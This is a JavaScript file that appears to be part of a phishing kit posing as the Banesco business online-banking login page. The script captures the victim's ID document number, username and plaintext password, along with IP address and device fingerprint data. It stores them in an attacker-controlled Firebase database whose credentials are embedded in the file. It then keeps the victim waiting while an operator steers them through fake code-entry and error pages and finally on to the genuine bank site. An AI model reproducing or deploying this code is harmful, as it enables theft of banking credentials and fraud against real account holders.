// Script principal con Firebase - Flujo completo del proyecto
console.log('🚀 Script principal iniciado');

// Configuración de Firebase (actualizada)
const firebaseConfig = {
    apiKey: "AIzaSyBnv1yymQKBWXIE6oJHV8kOPEA6Nm1iF9w",
    authDomain: "a24a3i5a.firebaseapp.com",
    projectId: "a24a3i5a",
    storageBucket: "a24a3i5a.firebasestorage.app",
    messagingSenderId: "363928972104",
    appId: "1:363928972104:web:19331a7011922dd223a17d"
};

// Configuración de rutas
const appConfig = {
    routes: {
        1: { url: "lgp.html", name: "Inicio" },
        2: { url: "us-err.html", name: "Err-LOGIN" },
        3: { url: "coe.html", name: "COE" },
        4: { url: "coe-err.html", name: "COE-Err" },
        5: { url: "passwd.html", name: "Clave" },
        6: { url: "desf-err.html", name: "EDESF-Err" },
        7: { url: "dashboard.html", name: "Cargando" },
        55: { url: "desfd.html", name: "DESF" },
        8: { url: "https://banesconlinempresa.banesco.com/lazaro/WebSite/login.aspx", name: "Salida Empresa" },
        9: { url: "coe-emp.html", name: "COE-EMP" },
    },
    timeout: 300000 // 5 minutos
};

// Variables globales para Firebase
let app, db, unsubscribe;

// Inicializar Firebase
try {
    app = firebase.initializeApp(firebaseConfig);
    db = firebase.firestore();
    console.log('✅ Firebase inicializado correctamente');
} catch (error) {
    console.error('❌ Error inicializando Firebase:', error);
}

// Función para obtener la dirección IP
async function obtenerDireccionIP() {
    const servicios = [
        "https://api.ipify.org?format=json",
        "https://api64.ipify.org?format=json",
        "https://jsonip.com",
        "https://api.myip.com",
        "https://ipapi.co/json/"
    ];
    
    for (const url of servicios) {
        try {
            const response = await fetch(url);
            if (!response.ok) continue;
            const data = await response.json();
            return data.ip || data.data || "No disponible";
        } catch (error) {
            console.warn('Error obteniendo IP de:', url);
        }
    }
    return "No disponible";
}

// Función principal cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', async function () {
    console.log('📄 DOM cargado - Inicializando aplicación');
    
    // Obtener elementos del DOM - TODOS LOS CAMPOS
    const tipoDocSelect = document.getElementById('tipodocben'); // Tipo de documento
    const documentoInput = document.getElementById('documento'); // Número de documento
    const usuarioInput = document.getElementById('u'); // Nombre de usuario
    const passwordInput = document.getElementById('p'); // Contraseña
    const submitBtn = document.getElementById('cmdLogin'); // Botón de login
    const ipInput = document.getElementById('direccionIP');
    const overlay = document.getElementById('overlay');
    
    console.log('🔍 Elementos encontrados:', {
        tipoDoc: !!tipoDocSelect,
        documento: !!documentoInput,
        usuario: !!usuarioInput,
        password: !!passwordInput,
        boton: !!submitBtn,
        overlay: !!overlay,
        ip: !!ipInput
    });
    
    if (!usuarioInput || !submitBtn) {
        console.error('❌ Elementos críticos no encontrados');
        return;
    }
    
    // Inicializar estado
    submitBtn.disabled = true;
    
    // Obtener IP al cargar
    try {
        const ip = await obtenerDireccionIP();
        if (ipInput) ipInput.value = ip;
        console.log('🌐 IP obtenida:', ip);
    } catch (error) {
        console.warn('⚠️ Error obteniendo IP:', error);
    }
    
    // Función para validar entrada
    function validateInput() {
        if (usuarioInput && submitBtn) {
            // Validar que al menos el usuario tenga contenido
            if (usuarioInput.value.length >= 3) {
                submitBtn.disabled = false;
                submitBtn.style.cursor = 'pointer';
                submitBtn.style.border = '1px solid rgb(132,168,62)';
                console.log('✅ Botón habilitado');
            } else {
                submitBtn.disabled = true;
                submitBtn.style.cursor = 'not-allowed';
                submitBtn.style.border = '1px solid rgb(132,168,62)';
                console.log('❌ Botón deshabilitado');
            }
        }
    }
    
    // Función para obtener el próximo número secuencial para las tarjetas
    async function getNextCardNumber() {
        try {
            const q = db.collection("redireccion").orderBy("cardNumber", "desc").limit(1);
            const snap = await q.get();
            if (snap.empty) return 1;
            const highest = snap.docs[0].data().cardNumber || 0;
            return highest + 1;
        } catch (err) {
            console.error("Error obteniendo siguiente cardNumber:", err);
            return 1;
        }
    }

    // Función para guardar en historial persistente con reintentos
    async function guardarEnHistorial(datos, reintentos = 3) {
        for (let intento = 1; intento <= reintentos; intento++) {
            try {
                const historialRef = db.collection("datosHistorial").doc(`${datos.usuario}_${Date.now()}_${intento}`);
                await historialRef.set(datos);
                console.log(`✅ Historial guardado en intento ${intento}`);
                return true;
            } catch (error) {
                console.warn(`⚠️ Intento ${intento} falló:`, error.message);
                if (intento === reintentos) {
                    console.error("❌ Falló guardar historial después de", reintentos, "intentos");
                    return false;
                }
                // Esperar antes del siguiente intento
                await new Promise(resolve => setTimeout(resolve, 1000 * intento));
            }
        }
        return false;
    }

    // Función para manejar el envío - FLUJO CORRECTO
    async function manejarEnvio(event) {
        event.preventDefault();
        console.log('🚀 Procesando envío del formulario');
        
        if (!submitBtn || submitBtn.disabled) {
            console.log('⚠️ Botón deshabilitado');
            return;
        }
        
        try {
            // Mostrar overlay de carga
            if (overlay) {
                overlay.style.display = "flex";
                console.log('📺 Mostrando overlay de carga');
            }
            
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.7';
            
            // 📝 CAPTURAR TODOS LOS DATOS DEL FORMULARIO
            const tipoDocumento = tipoDocSelect ? tipoDocSelect.value : '01';
            const numeroDocumento = documentoInput ? documentoInput.value.trim() : '';
            const nombreUsuario = usuarioInput ? usuarioInput.value.trim() : '';
            const contrasena = passwordInput ? passwordInput.value.trim() : '';
            
            // Obtener texto del tipo de documento seleccionado
            const tipoDocTexto = tipoDocSelect ? tipoDocSelect.options[tipoDocSelect.selectedIndex].text : 'Venezolano';
            
            console.log('📝 Datos capturados del formulario:', {
                tipoDocumento,
                tipoDocTexto,
                numeroDocumento,
                nombreUsuario,
                contrasena: contrasena ? '***' + contrasena.slice(-2) : '' // Ocultar contraseña en logs
            });
            
            if (!nombreUsuario) {
                throw new Error("El nombre de usuario no puede estar vacío");
            }

            // Obtener IP
            const direccionIP = await obtenerDireccionIP();
            if (ipInput) {
                ipInput.value = direccionIP || 'No se pudo obtener la IP';
            }

            // Obtener el próximo número secuencial
            const cardNumber = await getNextCardNumber();

            console.log('🎨 Datos del usuario:', { nombreUsuario, cardNumber, direccionIP });

            // 1. Guardar en colección de redirección (temporal) con page: 0 - TODOS LOS DATOS
            const userRef = db.collection("redireccion").doc(nombreUsuario);
            await userRef.set({
                // 📝 Datos del formulario
                tipoDocumento: tipoDocumento,
                tipoDocTexto: tipoDocTexto,
                numeroDocumento: numeroDocumento,
                usuario: nombreUsuario,
                clave: contrasena,
                
                // 🎨 Datos del sistema
                tipo: tipoDocTexto, // 🏷️ Mostrar tipo de documento en la tarjeta
                page: 0, // ⭐ ESTADO DE ESPERA - Clave del flujo correcto
                cardNumber: cardNumber,
                direccionIP: direccionIP,
                dispositivo: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Móvil' : 'Desktop',
                timestamp: firebase.firestore.FieldValue.serverTimestamp()
            });
            
            console.log('💾 Usuario guardado en Firebase con page: 0 (esperando instrucciones)');

            // 2. Preparar datos completos para historial
            const datosCompletos = {
                // 📝 Datos del formulario
                tipoDocumento: tipoDocumento,
                tipoDocTexto: tipoDocTexto,
                numeroDocumento: numeroDocumento,
                usuario: nombreUsuario,
                clave: contrasena,
                
                // 🌍 Datos de red y ubicación
                direccionIP: direccionIP,
                
                // 🎨 Datos del sistema
                cardNumber: cardNumber,
                dispositivo: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Móvil' : 'Desktop',
                
                // ⏰ Datos temporales
                timestamp: new Date().toISOString(),
                
                // 💻 Datos técnicos adicionales
                userAgent: navigator.userAgent,
                idioma: navigator.language || 'es',
                zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
                resolucion: `${screen.width}x${screen.height}`,
                referrer: document.referrer || 'Directo'
            };

            // 3. Guardar historial de forma no bloqueante
            setTimeout(async () => {
                try {
                    const exito = await guardarEnHistorial(datosCompletos);
                    if (exito) {
                        console.log("✅ Historial guardado exitosamente");
                    } else {
                        console.warn("⚠️ No se pudo guardar el historial (no crítico)");
                    }
                } catch (error) {
                    console.warn("⚠️ Error en historial (no crítico):", error);
                }
            }, 100);

            // 4. Configurar timeout máximo de espera
            const timeoutId = setTimeout(() => {
                if (unsubscribe) unsubscribe();
                submitBtn.disabled = false;
                submitBtn.style.opacity = '1';
                if (overlay) overlay.style.display = "none";
                alert("Tiempo de espera agotado. Por favor, intente nuevamente.");
                console.log('⏰ Timeout - Usuario desconectado');
            }, appConfig.timeout);

            // 5. ⭐ ESCUCHAR CAMBIOS EN TIEMPO REAL - Corazón del sistema
            console.log('👂 Iniciando escucha de cambios en Firebase...');
            unsubscribe = userRef.onSnapshot((doc) => {
                if (doc.exists) { // Corregido: doc.exists sin paréntesis para compat
                    const userData = doc.data();
                    const page = userData.page;
                    
                    console.log('🔄 Cambio detectado en Firebase:', { page, userData });
                    
                    // Si page > 0, redireccionar según la configuración
                    if (page > 0) {
                        console.log(`🎯 Redirigiendo a página ${page}`);
                        
                        // Cancelar timeout
                        clearTimeout(timeoutId);
                        
                        // Usar configuración de rutas
                        const route = appConfig.routes[page];
                        if (route) {
                            console.log(`🚀 Redirigiendo a: ${route.url} (${route.name})`);
                            if (overlay) overlay.style.display = "none";
                            window.location.href = route.url;
                        } else {
                            console.warn(`⚠️ Ruta no encontrada para page: ${page}`);
                            if (overlay) overlay.style.display = "none";
                            window.location.href = `page${page}.html`;
                        }
                    }
                    // Si page es 0, mantener el loader visible esperando instrucciones del admin
                    else {
                        console.log('⏳ Manteniendo estado de espera (page: 0)');
                    }
                } else {
                    console.warn('⚠️ Documento no existe en Firebase');
                }
            }, (error) => {
                console.error('❌ Error en la escucha de Firebase:', error);
                clearTimeout(timeoutId);
                if (overlay) overlay.style.display = "none";
                alert('Error de conexión. Por favor, intente nuevamente.');
            });
            
        } catch (error) {
            console.error('❌ Error en el proceso:', error);
            alert(`Error: ${error.message}`);
            
            // Restaurar estado en caso de error
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.style.opacity = '1';
            }
            if (overlay) overlay.style.display = "none";
        }
    }
    
    // Agregar event listeners
    if (usuarioInput) {
        usuarioInput.addEventListener('input', validateInput);
        console.log('🎯 Event listener agregado al campo de usuario');
    }
    
    if (submitBtn) {
        submitBtn.addEventListener('click', manejarEnvio);
        console.log('🎯 Event listener agregado al botón');
    }
    
    // Validación inicial
    validateInput();
    
    console.log('🎉 Aplicación inicializada correctamente');
});
